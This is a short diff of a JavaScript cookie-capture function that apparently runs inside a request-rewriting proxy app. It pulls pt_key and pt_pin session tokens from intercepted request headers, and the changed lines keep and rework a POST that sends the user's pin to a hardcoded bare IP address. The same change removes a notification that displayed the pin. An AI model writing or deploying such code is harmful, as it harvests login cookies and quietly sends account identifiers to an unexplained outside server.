@@ -48,12 +48,12 @@ function GetCookie() {
             var CV = $request.headers['Cookie'] || $request.headers['cookie'];
             if (CV.match(/(pt_key=.+?pt_pin=|pt_pin=.+?pt_key=)/)) {
                 const CookieValue = CV.match(/pt_key=.+?;/) + CV.match(/pt_pin=.+?;/);
-                $.notify('Cookie','',CookieValue);
+                $.notify('临时Cookie','',CookieValue);
                 var pt_pin =CV.match(/pt_pin=.+?;/)
                 var pin =pt_pin.toString().split('=')[1]
-                $.notify('用户pin','',"pin="+pin);
                 let data={"key":pin}
-                $.http.post("http://120.46.171.189/push",data)
+                const opt = {url: "http://120.46.171.189/push", body: JSON.stringify(data)};
+                $.http.post(opt).then((response) => JSON.parse(response.body));
             }
         }
         else{
